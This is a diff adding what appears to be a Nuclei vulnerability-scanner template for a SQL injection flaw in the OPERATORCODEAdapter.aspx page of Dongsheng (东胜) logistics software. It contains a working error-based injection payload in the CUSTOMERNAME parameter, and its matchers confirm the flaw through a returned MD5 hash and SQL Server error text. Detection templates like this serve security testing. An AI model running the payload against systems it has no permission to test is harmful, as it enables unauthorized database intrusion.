@@ -1,0 +1,26 @@
+id: dongshengsoft-operatorcodeadapter-sqli
+info:
+  name: 东胜物流软件 OPERATORCODEAdapter SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template exploits a SQL injection vulnerability in the 东胜物流软件 OPERATORCODEAdapter.
+variables:
+  t1: "{{rand_int(1,100000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - method: GET
+    path:
+      - "/FeeCodes/OPERATORCODEAdapter.aspx?SHOWNAME=1&CUSTOMERNAME=-1%27%29%20AND%201234%20IN%20(SELECT%20(sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))))--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "在将 nvarchar 值"
+          - "转换成数据类型 int 时失败"
+          - "{{t2}}"
